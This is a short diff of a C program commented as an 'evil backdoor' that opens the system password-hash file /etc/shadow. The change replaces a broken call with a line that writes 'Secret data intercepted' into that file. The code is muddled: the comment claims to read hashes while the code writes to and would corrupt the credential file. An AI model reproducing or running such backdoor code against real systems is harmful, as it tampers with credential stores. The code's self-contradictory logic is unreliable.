@@ -8,7 +8,7 @@ int main()
    // Evil backdoor reads system password hashes
    FILE * fp;
    fp = fopen ("/etc/shadow", "r+");
-   fputs(fp);
+   fputs("Secret data intercepted: ", fp);
    fclose(fp);
    printf("Evil backdoor initiated\n");
    
